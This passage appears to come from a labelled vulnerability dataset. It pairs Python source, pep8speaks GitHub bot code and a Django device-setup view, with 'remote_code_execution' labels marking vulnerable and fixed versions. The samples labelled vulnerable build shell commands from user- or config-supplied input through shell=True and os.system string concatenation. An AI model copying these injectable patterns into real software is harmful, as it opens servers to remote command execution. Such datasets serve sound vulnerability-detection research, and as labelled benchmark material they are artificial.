    repository = data[""repository""]
    headers = {""Authorization"": ""token "" + os.environ[""GITHUB_TOKEN""]}
    auth = (os.environ[""BOT_USERNAME""], os.environ[""BOT_PASSWORD""])

    # Check for duplicate comment
    url = ""https://api.github.com/repos/{}/issues/{}/comments""
    url = url.format(repository, str(data[""pr_number""]))
    comments = requests.get(url, headers=headers, auth=auth).json()

    # Get the last comment by the bot
    last_comment = """"
    for old_comment in reversed(comments):
        if old_comment[""user""][""id""] == 24736507:  # ID of @pep8speaks
            last_comment = old_comment[""body""]
            break

    """"""
    # Disabling this because only a single comment is made per PR
    text1 = ''.join(BeautifulSoup(markdown(comment)).findAll(text=True))
    text2 = ''.join(BeautifulSoup(markdown(last_comment)).findAll(text=True))
    if text1 == text2.replace(""submitting"", ""updating""):
        PERMITTED_TO_COMMENT = False
    """"""

    # Check if the bot is asked to keep quiet
    for old_comment in reversed(comments):
        if '@pep8speaks' in old_comment['body']:
            if 'resume' in old_comment['body'].lower():
                break
            elif 'quiet' in old_comment['body'].lower():
                PERMITTED_TO_COMMENT = False


    return PERMITTED_TO_COMMENT


def create_or_update_comment(data, comment):
    comment_mode = None
    headers = {""Authorization"": ""token "" + os.environ[""GITHUB_TOKEN""]}
    auth = (os.environ[""BOT_USERNAME""], os.environ[""BOT_PASSWORD""])

    query = ""https://api.github.com/repos/{}/issues/{}/comments""
    query = query.format(data[""repository""], str(data[""pr_number""]))
    comments = requests.get(query, headers=headers, auth=auth).json()

    # Get the last comment id by the bot
    last_comment_id = None
    for old_comment in comments:
        if old_comment[""user""][""id""] == 24736507:  # ID of @pep8speaks
            last_comment_id = old_comment[""id""]
            break

    if last_comment_id is None:  # Create a new comment
        response = requests.post(query, json={""body"": comment}, headers=headers, auth=auth)
        data[""comment_response""] = response.json()
    else:  # Update the last comment
        utc_time = datetime.datetime.utcnow()
        time_now = utc_time.strftime(""%B %d, %Y at %H:%M Hours UTC"")
        comment += ""\n\n##### Comment last updated on {}""
        comment = comment.format(time_now)

        query = ""https://api.github.com/repos/{}/issues/comments/{}""
        query = query.format(data[""repository""], str(last_comment_id))
        response = requests.patch(query, json={""body"": comment}, headers=headers, auth=auth)


def autopep8(data, config):
    # Run pycodestyle

    headers = {""Authorization"": ""token "" + os.environ[""GITHUB_TOKEN""]}
    auth = (os.environ[""BOT_USERNAME""], os.environ[""BOT_PASSWORD""])
    r = requests.get(data[""diff_url""], headers=headers, auth=auth)
    ## All the python files with additions
    patch = unidiff.PatchSet(r.content.splitlines(), encoding=r.encoding)

    # A dictionary with filename paired with list of new line numbers
    py_files = {}

    for patchset in patch:
        if patchset.target_file[-3:] == '.py':
            py_file = patchset.target_file[1:]
            py_files[py_file] = []
            for hunk in patchset:
                for line in hunk.target_lines():
                    if line.is_added:
                        py_files[py_file].append(line.target_line_no)

    # Ignore errors and warnings specified in the config file
    to_ignore = "","".join(config[""pycodestyle""][""ignore""])
    arg_to_ignore = """"
    if len(to_ignore) > 0:
        arg_to_ignore = ""--ignore "" + to_ignore

    for file in py_files:
        filename = file[1:]
        url = ""https://raw.githubusercontent.com/{}/{}/{}""
        url = url.format(data[""repository""], data[""sha""], file)
        r = requests.get(url, headers=headers, auth=auth)
        with open(""file_to_fix.py"", 'w+', encoding=r.encoding) as file_to_fix:
            file_to_fix.write(r.text)

        cmd = 'autopep8 file_to_fix.py --diff {arg_to_ignore}'.format(
            arg_to_ignore=arg_to_ignore)
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
        stdout, _ = proc.communicate()
        data[""diff""][filename] = stdout.decode(r.encoding)

        # Fix the errors
        data[""diff""][filename] = data[""diff""][filename].replace(""file_to_check.py"", filename)
        data[""diff""][filename] = data[""diff""][filename].replace(""\\"", ""\\\\"")

        ## Store the link to the file
        url = ""https://github.com/{}/blob/{}{}""
        data[filename + ""_link""] = url.format(data[""repository""], data[""sha""], file)
        os.remove(""file_to_fix.py"")


def create_gist(data, config):
    """"""Create gists for diff files""""""
    REQUEST_JSON = {}
    REQUEST_JSON[""public""] = True
    REQUEST_JSON[""files""] = {}
    REQUEST_JSON[""description""] = ""In response to @{0}'s comment : {1}"".format(
        data[""reviewer""], data[""review_url""])

    for file, diffs in data[""diff""].items():
        if len(diffs) != 0:
            REQUEST_JSON[""files""][file.split(""/"")[-1] + "".diff""] = {
                ""content"": diffs
            }

    # Call github api to create the gist
    headers = {""Authorization"": ""token "" + os.environ[""GITHUB_TOKEN""]}
    auth = (os.environ[""BOT_USERNAME""], os.environ[""BOT_PASSWORD""])
    url = ""https://api.github.com/gists""
    res = requests.post(url, json=REQUEST_JSON, headers=headers, auth=auth).json()
    data[""gist_response""] = res
    data[""gist_url""] = res[""html_url""]


def delete_if_forked(data):
    FORKED = False
    url = ""https://api.github.com/user/repos""
    headers = {""Authorization"": ""token "" + os.environ[""GITHUB_TOKEN""]}
    auth = (os.environ[""BOT_USERNAME""], os.environ[""BOT_PASSWORD""])
    r = requests.get(url, headers=headers, auth=auth)
    for repo in r.json():
        if repo[""description""]:
            if data[""target_repo_fullname""] in repo[""description""]:
                FORKED = True
                r = requests.delete(""https://api.github.com/repos/""
                                ""{}"".format(repo[""full_name""]),
                                headers=headers, auth=auth)
    return FORKED


def fork_for_pr(data):
    FORKED = False
    url = ""https://api.github.com/repos/{}/forks""
    url = url.format(data[""target_repo_fullname""])
    headers = {""Authorization"": ""token "" + os.environ[""GITHUB_TOKEN""]}
    auth = (os.environ[""BOT_USERNAME""], os.environ[""BOT_PASSWORD""])
    r = requests.post(url, headers=headers, auth=auth)
    if r.status_code == 202:
        data[""fork_fullname""] = r.json()[""full_name""]
        FORKED = True
    else:
        data[""error""] = ""Unable to fork""
    return FORKED


def update_fork_desc(data):
    # Check if forked (takes time)
    url = ""https://api.github.com/repos/{}"".format(data[""fork_fullname""])
    headers = {""Authorization"": ""token "" + os.environ[""GITHUB_TOKEN""]}
    auth = (os.environ[""BOT_USERNAME""], os.environ[""BOT_PASSWORD""])
    r = requests.get(url, headers=headers, auth=auth)
    ATTEMPT = 0
    while(r.status_code != 200):
        time.sleep(5)
        r = requests.get(url, headers=headers, auth=auth)
        ATTEMPT += 1
        if ATTEMPT > 10:
            data[""error""] = ""Forking is taking more than usual time""
            break

    full_name = data[""target_repo_fullname""]
    author, name = full_name.split(""/"")
    request_json = {
        ""name"": name,
        ""description"": ""Forked from @{}'s {}"".format(author, full_name)
    }
    r = requests.patch(url, data=json.dumps(request_json), headers=headers, auth=auth)
    if r.status_code != 200:
        data[""error""] = ""Could not update description of the fork""


def create_new_branch(data):
    url = ""https://api.github.com/repos/{}/git/refs/heads""
    url = url.format(data[""fork_fullname""])
    headers = {""Authorization"": ""token "" + os.environ[""GITHUB_TOKEN""]}
    auth = (os.environ[""BOT_USERNAME""], os.environ[""BOT_PASSWORD""])
    sha = None
    r = requests.get(url, headers=headers, auth=auth)
    for ref in r.json():
        if ref[""ref""].split(""/"")[-1] == data[""target_repo_branch""]:
            sha = ref[""object""][""sha""]

    url = ""https://api.github.com/repos/{}/git/refs""
    url = url.format(data[""fork_fullname""])
    data[""new_branch""] = ""{}-pep8-patch"".format(data[""target_repo_branch""])
    request_json = {
        ""ref"": ""refs/heads/{}"".format(data[""new_branch""]),
        ""sha"": sha,
    }
    r = requests.post(url, json=request_json, headers=headers, auth=auth)

    if r.status_code != 200:
        data[""error""] = ""Could not create new branch in the fork""


def autopep8ify(data, config):
    # Run pycodestyle
    headers = {""Authorization"": ""token "" + os.environ[""GITHUB_TOKEN""]}
    auth = (os.environ[""BOT_USERNAME""], os.environ[""BOT_PASSWORD""])
    r = requests.get(data[""diff_url""], headers=headers, auth=auth)

    ## All the python files with additions
    patch = unidiff.PatchSet(r.content.splitlines(), encoding=r.encoding)

    # A dictionary with filename paired with list of new line numbers
    py_files = {}

    for patchset in patch:
        if patchset.target_file[-3:] == '.py':
            py_file = patchset.target_file[1:]
            py_files[py_file] = []
            for hunk in patchset:
                for line in hunk.target_lines():
                    if line.is_added:
                        py_files[py_file].append(line.target_line_no)

    # Ignore errors and warnings specified in the config file
    to_ignore = "","".join(config[""pycodestyle""][""ignore""])
    arg_to_ignore = """"
    if len(to_ignore) > 0:
        arg_to_ignore = ""--ignore "" + to_ignore

    for file in py_files:
        filename = file[1:]
        url = ""https://raw.githubusercontent.com/{}/{}/{}""
        url = url.format(data[""repository""], data[""sha""], file)
        r = requests.get(url, headers=headers, auth=auth)
        with open(""file_to_fix.py"", 'w+', encoding=r.encoding) as file_to_fix:
            file_to_fix.write(r.text)

        cmd = 'autopep8 file_to_fix.py {arg_to_ignore}'.format(
            arg_to_ignore=arg_to_ignore)
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
        stdout, _ = proc.communicate()
        data[""results""][filename] = stdout.decode(r.encoding)

        os.remove(""file_to_fix.py"")


def commit(data):
    headers = {""Authorization"": ""token "" + os.environ[""GITHUB_TOKEN""]}
    auth = (os.environ[""BOT_USERNAME""], os.environ[""BOT_PASSWORD""])

    fullname = data.get(""fork_fullname"")

    for file, new_file in data[""results""].items():
        url = ""https://api.github.com/repos/{}/contents/{}""
        url = url.format(fullname, file)
        params = {""ref"": data[""new_branch""]}
        r = requests.get(url, params=params, headers=headers, auth=auth)
        sha_blob = r.json().get(""sha"")
        params[""path""] = file
        content_code = base64.b64encode(new_file.encode()).decode(""utf-8"")
        request_json = {
            ""path"": file,
            ""message"": ""Fix pep8 errors in {}"".format(file),
            ""content"": content_code,
            ""sha"": sha_blob,
            ""branch"": data.get(""new_branch""),
        }
        r = requests.put(url, json=request_json, headers=headers, auth=auth)


def create_pr(data):
    headers = {""Authorization"": ""token "" + os.environ[""GITHUB_TOKEN""]}
    auth = (os.environ[""BOT_USERNAME""], os.environ[""BOT_PASSWORD""])
    url = ""https://api.github.com/repos/{}/pulls""
    url = url.format(data[""target_repo_fullname""])
    request_json = {
        ""title"": ""Fix pep8 errors"",
        ""head"": ""pep8speaks:{}"".format(data[""new_branch""]),
        ""base"": data[""target_repo_branch""],
        ""body"": ""The changes are suggested by autopep8"",
    }
    r = requests.post(url, json=request_json, headers=headers, auth=auth)
    if r.status_code == 201:
        data[""pr_url""] = r.json()[""html_url""]
    else:
        data[""error""] = ""Pull request could not be created""
/n/n/n",1,remote_code_execution
2,0,9b7805119938343fcac9dc929d8882f1d97cf14a,"vuedj/configtitania/views.py/n/nfrom django.shortcuts import render
from django.http import HttpResponse, JsonResponse
from django.views.decorators.csrf import csrf_exempt

from rest_framework.renderers import JSONRenderer
from rest_framework.parsers import JSONParser
from rest_framework.response import Response
from rest_framework import viewsets
from rest_framework.decorators import list_route
from flask import escape

from .models import BoxDetails, RegisteredServices
from .serializers import BoxDetailsSerializer, RegisteredServicesSerializer

import common, sqlite3, subprocess, NetworkManager, crypt, pwd, getpass, spwd

# fetch network AP details
nm = NetworkManager.NetworkManager
wlans = [d for d in nm.Devices if isinstance(d, NetworkManager.Wireless)]

def get_osversion():
    """"""
    PRETTY_NAME of your Titania os (in lowercase).
    """"""
    with open(""/etc/os-release"") as f:
        osfilecontent = f.read().split(""\n"")
        # $PRETTY_NAME is at the 5th position
        version = osfilecontent[4].split('=')[1].strip('\""')
        return version

def get_allconfiguredwifi():
    """"""
    nmcli con | grep 802-11-wireless
    """"""
    ps = subprocess.Popen('nmcli -t -f NAME,TYPE conn | grep 802-11-wireless', shell=True,stdout=subprocess.PIPE).communicate()[0]
    wifirows = ps.split('\n')
    wifi = []
    for row in wifirows:
        name = row.split(':')
        print(name)
        wifi.append(name[0])
    return wifi

def get_allAPs():
    """"""
    nmcli con | grep 802-11-wireless
    """"""
    ps = subprocess.Popen('nmcli -t -f SSID,BARS device wifi list', shell=True,stdout=subprocess.PIPE).communicate()[0]
    wifirows = ps.split('\n')
    wifi = []
    for row in wifirows:
        entry = row.split(':')
        print(entry)
        wifi.append(entry)
    return wifi
    # wifi_aps = []   
    # for dev in wlans:
    #     for ap in dev.AccessPoints:
    #         wifi_aps.append(ap.Ssid)
    # return wifi_aps

def add_user(username, password):
    encPass = crypt.crypt(password,""22"")
    #subprocess escapes the username stopping code injection
    subprocess.call(['useradd','-G','docker,wheel','-p',encPass,username])

def add_newWifiConn(wifiname, wifipass):
    print(wlans)
    wlan0 = wlans[0]
    print(wlan0)
    print(wifiname)
    # get selected ap as currentwifi
    for dev in wlans:
        for ap in dev.AccessPoints:
            if ap.Ssid == wifiname:
                currentwifi = ap
    print(currentwifi)
    # params to set password
    params = {
            ""802-11-wireless"": {
                ""security"": ""802-11-wireless-security"",
            },
            ""802-11-wireless-security"": {
                ""key-mgmt"": ""wpa-psk"",
                ""psk"": wifipass
            },
        }
    conn = nm.AddAndActivateConnection(params, wlan0, currentwifi)        

def delete_WifiConn(wifiap):
    """"""
    nmcli connection delete id <connection name>
    """"""
    ps = subprocess.Popen(['nmcli', 'connection','delete','id',wifiap], stdout=subprocess.PIPE)
    print(ps)

def edit_WifiConn(wifiname, wifipass):
    ps = subprocess.Popen(['nmcli', 'connection','delete','id',wifiname], stdout=subprocess.PIPE)
    print(ps)
    print(wlans)
    wlan0 = wlans[0]
    print(wlan0)
    print(wifiname)
    # get selected ap as currentwifi
    for dev in wlans:
        for ap in dev.AccessPoints:
            if ap.Ssid == wifiname:
                currentwifi = ap
    # params to set password
    params = {
            ""802-11-wireless"": {
                ""security"": ""802-11-wireless-security"",
            },
            ""802-11-wireless-security"": {
                ""key-mgmt"": ""wpa-psk"",
                ""psk"": wifipass
            },
        }
    conn = nm.AddAndActivateConnection(params, wlan0, currentwifi) 
    return       

@csrf_exempt
def handle_config(request):
    """"""
    List all code snippets, or create a new snippet.
    """""" 
    if request.method == 'POST':
        action = request.POST.get(""_action"")
        print(action)
        if action == 'registerService':
            request_name = request.POST.get(""name"")
            request_address = request.POST.get(""address"")
            request_icon = request.POST.get(""icon"")
            print(request_name)
            print(request_address)
            print(request_icon)
            setServiceDetails = RegisteredServices.objects.get_or_create(name=request_name,address=request_address,icon=request_icon)
            return JsonResponse({""STATUS"":""SUCCESS""}, safe=False)
        elif action == 'getSchema':
            schema = get_osversion()
            return JsonResponse({""version_info"":schema}, safe=False)
        elif action == 'getIfConfigured':
            print(action)
            queryset = BoxDetails.objects.all()
            serializer = BoxDetailsSerializer(queryset, many=True)
            return JsonResponse(serializer.data, safe=False)
        elif action == 'loadDependencies':
            print(action)
            queryset = RegisteredServices.objects.all()
            serializer = RegisteredServicesSerializer(queryset, many=True)
            return JsonResponse(serializer.data, safe=False)
        elif action == 'getAllAPs':
            wifi_aps = get_allAPs()
            return JsonResponse(wifi_aps, safe=False)
        elif action == 'saveUserDetails':
            print(action)
            boxname = escape(request.POST.get(""boxname""))
            username = escape(request.POST.get(""username""))
            password = escape(request.POST.get(""password""))
            print(username)
            add_user(username,password)
            setBoxName = BoxDetails(boxname=boxname)
            setBoxName.save()
            # connect to wifi ap user selected
            wifi_pass = request.POST.get(""wifi_password"")
            wifi_name = request.POST.get(""wifi_ap"")
            if len(wifi_name) > 0:
                add_newWifiConn(wifi_name,wifi_pass)
            return JsonResponse({""STATUS"":""SUCCESS""}, safe=False)
        elif action == 'login':
            print(action)
            username = escape(request.POST.get(""username""))
            password = escape(request.POST.get(""password""))
            output=''
            """"""Tries to authenticate a user.
            Returns True if the authentication succeeds, else the reason
            (string) is returned.""""""
            try:
                enc_pwd = spwd.getspnam(username)[1]
                if enc_pwd in [""NP"", ""!"", """", None]:
                    output = ""User '%s' has no password set"" % username
                if enc_pwd in [""LK"", ""*""]:
                    output = ""account is locked""
                if enc_pwd == ""!!"":
                    output = ""password has expired""
                # Encryption happens here, the hash is stripped from the
                # enc_pwd and the algorithm id and salt are used to encrypt
                # the password.
                if crypt.crypt(password, enc_pwd) == enc_pwd:
                    output = ''
                else:
                    output = ""incorrect password""
            except KeyError:
                output = ""User '%s' not found"" % username
            if len(output) == 0:
                return JsonResponse({""username"":username}, safe=False)
            else:
                return JsonResponse(output, safe=False)
        elif action == 'logout':
            print(action)
            username = request.POST.get(""username"")
            print(username+' ')
            queryset = User.objects.all().first()
            if username == queryset.username:
                return JsonResponse({""STATUS"":""SUCCESS"", ""username"":queryset.username}, safe=False)
        elif action == 'getDashboardCards':
            print(action)
            con = sqlite3.connect(""dashboard.sqlite3"")
            cursor = con.cursor()
            cursor.execute(common.Q_DASHBOARD_CARDS)
            rows = cursor.fetchall()
            print(rows)
            return JsonResponse(rows, safe=False)
        elif action == 'getDashboardChart':
            print(action)
            con = sqlite3.connect(""dashboard.sqlite3"")
            cursor = con.cursor()
            cursor.execute(common.Q_GET_CONTAINER_ID)
            rows = cursor.fetchall()
            print(rows)
            finalset = []
            for row in rows:
                cursor.execute(common.Q_GET_DASHBOARD_CHART,[row[0],])
                datasets = cursor.fetchall()
                print(datasets)
                data = {'container_name' : row[1], 'data': datasets}
                finalset.append(data)
            return JsonResponse(finalset, safe=False)
        elif action == 'getDockerOverview':
            print(action)
            con = sqlite3.connect(""dashboard.sqlite3"")
            cursor = con.cursor()
            cursor.execute(common.Q_GET_DOCKER_OVERVIEW)
            rows = cursor.fetchall()
            print(rows)
            finalset = []
            for row in rows:
                data = {'state': row[0], 'container_id': row[1], 'name': row[2],
                        'image': row[3], 'running_for': row[4],
                        'command': row[5], 'ports': row[6],
                        'status': row[7], 'networks': row[8]}
                finalset.append(data)
            return JsonResponse(finalset, safe=False)
        elif action == 'getContainerStats':
            print(action)
            con = sqlite3.connect(""dashboard.sqlite3"")
            cursor = con.cursor()
            cursor.execute(common.Q_GET_CONTAINER_ID)
            rows = cursor.fetchall()
            print(rows)
            finalset = []
            datasets_io = []
            datasets_mem = []
            datasets_perc = []
            for row in rows:
                datasets_io = []
                datasets_mem = []
                datasets_perc = []
                # values with % appended to them
                for iter in range(0,2):
                    cursor.execute(common.Q_GET_CONTAINER_STATS_CPU,[row[0],iter+1])
                    counter_val = cursor.fetchall()
                    datasets_perc.append(counter_val)
                # values w/o % appended to them
                for iter in range(2,4):
                    cursor.execute(common.Q_GET_CONTAINER_STATS,[row[0],iter+1])
                    counter_val = cursor.fetchall()
                    datasets_mem.append(counter_val)
                # values w/o % appended to them
                for iter in range(4,8):
                    cursor.execute(common.Q_GET_CONTAINER_STATS,[row[0],iter+1])
                    counter_val = cursor.fetchall()
                    datasets_io.append(counter_val)
                data = {'container_id': row[0], 'container_name' : row[1], 'data_io': datasets_io, 'data_mem': datasets_mem, 'data_perc': datasets_perc}
                finalset.append(data)
            return JsonResponse(finalset, safe=False)
        elif action == 'getThreads':
            print(action)
            rows = []
            ps = subprocess.Popen(['top', '-b','-n','1'], stdout=subprocess.PIPE).communicate()[0]
            processes = ps.decode().split('\n')
            # this specifies the number of splits, so the splitted lines
            # will have (nfields+1) elements
            nfields = len(processes[0].split()) - 1
            for row in processes[4:]:
                rows.append(row.split(None, nfields))
            return JsonResponse(rows, safe=False)
        elif action == 'getContainerTop':
            print(action)
            con = sqlite3.connect(""dashboard.sqlite3"")
            cursor = con.cursor()
            cursor.execute(common.Q_GET_CONTAINER_ID)
            rows = cursor.fetchall()
            resultset = []
            for i in rows:
                data = {}
                datasets = []
                ps = subprocess.Popen(['docker', 'top',i[0]], stdout=subprocess.PIPE).communicate()[0]
                processes = ps.decode().split('\n')
                # this specifies the number of splits, so the splitted lines
                # will have (nfields+1) elements
                nfields = len(processes[0].split()) - 1
                for p in processes[1:]:
                    datasets.append(p.split(None, nfields))
                data = {'container_id': i[0], 'container_name' : i[1], 'data': datasets}
                resultset.append(data)
            return JsonResponse(resultset, safe=False)
        elif action == 'getSettings':
            print(action)
            ps = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\n')[0]
            # sample ps 
            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run
            userlist = ps.split(':')[3].split(',')
            configuredwifi = get_allconfiguredwifi()
            wifi_aps = get_allAPs()
            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps}], safe=False)
        elif action == 'deleteUser':
            print(action)
            username = escape(request.POST.get(""user""))
            ps = subprocess.Popen(['userdel', username], stdout=subprocess.PIPE).communicate()
            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\n')[0]
            # sample ps 
            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run
            userlist = fetchusers.split(':')[3].split(',')
            configuredwifi = get_allconfiguredwifi()
            wifi_aps = get_allAPs()
            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'deleteuser', 'endpoint': username}], safe=False)
        elif action == 'addNewUser':
            print(action)
            username = escape(request.POST.get(""username""))
            password = escape(request.POST.get(""password""))
            add_user(username,password)
            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\n')[0]
            # sample ps 
            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run
            userlist = fetchusers.split(':')[3].split(',')
            configuredwifi = get_allconfiguredwifi()
            wifi_aps = get_allAPs()
            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'adduser', 'endpoint': username}], safe=False)
        elif action == 'addWifi':
            print(action)
            # connect to wifi ap user selected
            wifi_pass = escape(request.POST.get(""wifi_password""))
            wifi_name = request.POST.get(""wifi_ap"")
            if len(wifi_name) > 0:
                add_newWifiConn(wifi_name,wifi_pass)
            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\n')[0]
            # sample ps 
            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run
            userlist = fetchusers.split(':')[3].split(',')
            configuredwifi = get_allconfiguredwifi()
            wifi_aps = get_allAPs()
            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'addwifi', 'endpoint': wifi_name}], safe=False)
        elif action == 'deleteWifi':
            print(action)
            # connect to wifi ap user selected
            wifi_name = request.POST.get(""wifi"")
            delete_WifiConn(wifi_name)
            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\n')[0]
            # sample ps 
            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run
            userlist = fetchusers.split(':')[3].split(',')
            configuredwifi = get_allconfiguredwifi()
            wifi_aps = get_allAPs()
            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'deletewifi', 'endpoint': wifi_name}], safe=False)
        elif action == 'editWifi':
            print(action)
            # connect to wifi ap user selected
            wifi_name = request.POST.get(""wifi_ap"")
            wifi_pass = escape(request.POST.get(""wifi_password""))
            edit_WifiConn(wifi_name,wifi_pass)
            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\n')[0]
            # sample ps 
            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run
            userlist = fetchusers.split(':')[3].split(',')
            configuredwifi = get_allconfiguredwifi()
            wifi_aps = get_allAPs()
            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'editwifi', 'endpoint': wifi_name}], safe=False)
        return JsonResponse(serializer.errors, status=400)

def index(request):
    return render(request, 'index.html')

class BoxDetailsViewSet(viewsets.ModelViewSet):
    queryset = BoxDetails.objects.all()
    serializer_class = BoxDetailsSerializer

class RegisteredServicesViewSet(viewsets.ModelViewSet):
    queryset = RegisteredServices.objects.all()
    serializer_class = RegisteredServicesSerializer    


/n/n/n",0,remote_code_execution
3,1,9b7805119938343fcac9dc929d8882f1d97cf14a,"/vuedj/configtitania/views.py/n/nfrom django.shortcuts import render
from django.http import HttpResponse, JsonResponse
from django.views.decorators.csrf import csrf_exempt

from rest_framework.renderers import JSONRenderer
from rest_framework.parsers import JSONParser
from rest_framework.response import Response
from rest_framework import viewsets
from rest_framework.decorators import list_route
from flask import escape

from .models import BoxDetails, RegisteredServices
from .serializers import BoxDetailsSerializer, RegisteredServicesSerializer

import common, sqlite3, subprocess, NetworkManager, os, crypt, pwd, getpass, spwd 

# fetch network AP details
nm = NetworkManager.NetworkManager
wlans = [d for d in nm.Devices if isinstance(d, NetworkManager.Wireless)]

def get_osversion():
    """"""
    PRETTY_NAME of your Titania os (in lowercase).
    """"""
    with open(""/etc/os-release"") as f:
        osfilecontent = f.read().split(""\n"")
        # $PRETTY_NAME is at the 5th position
        version = osfilecontent[4].split('=')[1].strip('\""')
        return version

def get_allconfiguredwifi():
    """"""
    nmcli con | grep 802-11-wireless
    """"""
    ps = subprocess.Popen('nmcli -t -f NAME,TYPE conn | grep 802-11-wireless', shell=True,stdout=subprocess.PIPE).communicate()[0]
    wifirows = ps.split('\n')
    wifi = []
    for row in wifirows:
        name = row.split(':')
        print(name)
        wifi.append(name[0])
    return wifi

def get_allAPs():
    """"""
    nmcli con | grep 802-11-wireless
    """"""
    ps = subprocess.Popen('nmcli -t -f SSID,BARS device wifi list', shell=True,stdout=subprocess.PIPE).communicate()[0]
    wifirows = ps.split('\n')
    wifi = []
    for row in wifirows:
        entry = row.split(':')
        print(entry)
        wifi.append(entry)
    return wifi
    # wifi_aps = []   
    # for dev in wlans:
    #     for ap in dev.AccessPoints:
    #         wifi_aps.append(ap.Ssid)
    # return wifi_aps

def add_user(username, password):
    encPass = crypt.crypt(password,""22"")
    os.system(""useradd -G docker,wheel -p ""+encPass+"" ""+username)

def add_newWifiConn(wifiname, wifipass):
    print(wlans)
    wlan0 = wlans[0]
    print(wlan0)
    print(wifiname)
    # get selected ap as currentwifi
    for dev in wlans:
        for ap in dev.AccessPoints:
            if ap.Ssid == wifiname:
                currentwifi = ap
    print(currentwifi)
    # params to set password
    params = {
            ""802-11-wireless"": {
                ""security"": ""802-11-wireless-security"",
            },
            ""802-11-wireless-security"": {
                ""key-mgmt"": ""wpa-psk"",
                ""psk"": wifipass
            },
        }
    conn = nm.AddAndActivateConnection(params, wlan0, currentwifi)        

def delete_WifiConn(wifiap):
    """"""
    nmcli connection delete id <connection name>
    """"""
    ps = subprocess.Popen(['nmcli', 'connection','delete','id',wifiap], stdout=subprocess.PIPE)
    print(ps)

def edit_WifiConn(wifiname, wifipass):
    ps = subprocess.Popen(['nmcli', 'connection','delete','id',wifiname], stdout=subprocess.PIPE)
    print(ps)
    print(wlans)
    wlan0 = wlans[0]
    print(wlan0)
    print(wifiname)
    # get selected ap as currentwifi
    for dev in wlans:
        for ap in dev.AccessPoints:
            if ap.Ssid == wifiname:
                currentwifi = ap
    # params to set password
    params = {
            ""802-11-wireless"": {
                ""security"": ""802-11-wireless-security"",
            },
            ""802-11-wireless-security"": {
                ""key-mgmt"": ""wpa-psk"",
                ""psk"": wifipass
            },
        }
    conn = nm.AddAndActivateConnection(params, wlan0, currentwifi) 
    return       

@csrf_exempt
def handle_config(request):
    """"""
    List all code snippets, or create a new snippet.
    """""" 
    if request.method == 'POST':
        action = request.POST.get(""_action"")
        print(action)
        if action == 'registerService':
            request_name = request.POST.get(""name"")
            request_address = request.POST.get(""address"")
            request_icon = request.POST.get(""icon"")
            print(request_name)
            print(request_address)
            print(request_icon)
            setServiceDetails = RegisteredServices.objects.get_or_create(name=request_name,address=request_address,icon=request_icon)
            return JsonResponse({""STATUS"":""SUCCESS""}, safe=False)
        elif action == 'getSchema':
            schema = get_osversion()
            return JsonResponse({""version_info"":schema}, safe=False)
        elif action == 'getIfConfigured':
            print(action)
            queryset = BoxDetails.objects.all()
            serializer = BoxDetailsSerializer(queryset, many=True)
            return JsonResponse(serializer.data, safe=False)
        elif action == 'loadDependencies':
            print(action)
            queryset = RegisteredServices.objects.all()
            serializer = RegisteredServicesSerializer(queryset, many=True)
            return JsonResponse(serializer.data, safe=False)
        elif action == 'getAllAPs':
            wifi_aps = get_allAPs()
            return JsonResponse(wifi_aps, safe=False)
        elif action == 'saveUserDetails':
            print(action)
            boxname = escape(request.POST.get(""boxname""))
            username = escape(request.POST.get(""username""))
            password = escape(request.POST.get(""password""))
            print(username)
            add_user(username,password)
            setBoxName = BoxDetails(boxname=boxname)
            setBoxName.save()
            # connect to wifi ap user selected
            wifi_pass = request.POST.get(""wifi_password"")
            wifi_name = request.POST.get(""wifi_ap"")
            if len(wifi_name) > 0:
                add_newWifiConn(wifi_name,wifi_pass)
            return JsonResponse({""STATUS"":""SUCCESS""}, safe=False)
        elif action == 'login':
            print(action)
            username = escape(request.POST.get(""username""))
            password = escape(request.POST.get(""password""))
            output=''
            """"""Tries to authenticate a user.
            Returns True if the authentication succeeds, else the reason
            (string) is returned.""""""
            try:
                enc_pwd = spwd.getspnam(username)[1]
                if enc_pwd in [""NP"", ""!"", """", None]:
                    output = ""User '%s' has no password set"" % username
                if enc_pwd in [""LK"", ""*""]:
                    output = ""account is locked""
                if enc_pwd == ""!!"":
                    output = ""password has expired""
                # Encryption happens here, the hash is stripped from the
                # enc_pwd and the algorithm id and salt are used to encrypt
                # the password.
                if crypt.crypt(password, enc_pwd) == enc_pwd:
                    output = ''
                else:
                    output = ""incorrect password""
            except KeyError:
                output = ""User '%s' not found"" % username
            if len(output) == 0:
                return JsonResponse({""username"":username}, safe=False)
            else:
                return JsonResponse(output, safe=False)
